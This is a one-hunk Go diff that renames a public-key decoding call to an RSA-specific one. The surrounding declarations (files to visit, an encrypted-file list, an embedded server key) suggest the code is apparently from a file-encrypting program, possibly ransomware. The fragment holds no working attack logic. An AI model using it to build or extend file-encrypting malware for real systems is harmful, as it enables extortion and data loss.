@@ -17,7 +17,7 @@ var (
 	filesToVisit  = make(chan io.File)
 	encryptedList []string
 	waitGroup     sync.WaitGroup
-	sPubKey       = io.DecodePublicKey(utils.SPubKeyPem)
+	sPubKey       = io.DecodeRSAPublicKey(utils.SPubKeyPem)
 )
 
 func main() {
